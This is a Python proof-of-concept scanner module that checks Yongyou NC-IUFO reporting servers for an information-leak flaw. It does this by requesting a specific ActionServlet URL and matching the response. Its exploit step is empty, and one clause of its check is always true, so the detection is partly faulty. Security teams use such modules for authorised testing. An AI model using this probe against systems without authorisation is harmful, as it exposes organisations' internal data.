# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import os
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'yongyou_0038' # 平台漏洞编号，留空
    name = '用友NC-IUFO报表系统部分安全问题' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-01-03'  # 漏洞公布时间
    desc = '''
        用友NC-IUFO报表系统部分安全问题（影响多个大客户）
    ''' # 漏洞描述
    ref = 'https://www.secpulse.com/archives/27741.html' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'yongyou'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'yongyou_0038' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease&TreeSelectedID=&TableSelectedID='
            url = arg + payload
            code, head,res, errcode, _ = hh.http(url)
            if code == 200 and 'iufo/web/images/usericon.gif' in res and len(res) > 10000 and '/iufo/web/images/tree/tree_plus.gif':
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()